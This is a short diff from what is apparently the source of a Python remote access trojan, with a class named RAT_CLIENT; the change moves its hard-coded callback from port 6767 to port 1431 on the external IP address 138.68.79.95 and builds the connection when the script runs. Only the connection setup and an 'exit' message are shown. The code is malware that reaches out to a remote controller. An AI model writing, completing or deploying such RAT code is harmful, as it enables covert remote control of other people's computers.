@@ -82,7 +82,7 @@ class RAT_CLIENT:
                 s.send(b"exit")
                 break
 
-rat = RAT_CLIENT('138.68.79.95', 6767)
+rat = RAT_CLIENT('138.68.79.95', 1431)
 
 if __name__ == '__main__':
     rat.build_connection()
